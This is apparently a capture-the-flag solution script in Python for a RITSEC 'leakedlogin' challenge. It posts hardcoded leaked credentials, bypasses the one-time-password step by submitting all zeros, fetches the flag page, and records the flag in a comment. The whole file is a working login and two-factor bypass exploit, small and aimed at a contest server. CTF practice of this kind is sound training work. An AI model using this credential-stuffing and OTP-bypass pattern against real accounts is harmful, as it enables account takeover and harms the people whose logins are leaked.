import requests

username = 'zach@bingus.biz'
password = 'b1nguS2000'


s = requests.Session()

url = 'https://leakedlogin.ctf.ritsec.club/verify'


r = s.post(url, data={'email': username, 'password': password})

print(r.text)


otp_url = 'https://leakedlogin.ctf.ritsec.club/verify/process.php'


otp = [0,0,0,0,0,0]

r = s.post(otp_url, data={'otp_1': otp[0], 'otp_2': otp[1], 'otp_3': otp[2], 'otp_4': otp[3], 'otp_5': otp[4], 'otp_6': otp[5], })

print(r.text)

flag_url = 'https://leakedlogin.ctf.ritsec.club/verify/flag.php'

r = s.post(flag_url, data={'goodness': '1'})

print(r.text)

# RS{z3r0_fact0r_auth3nticati0n}
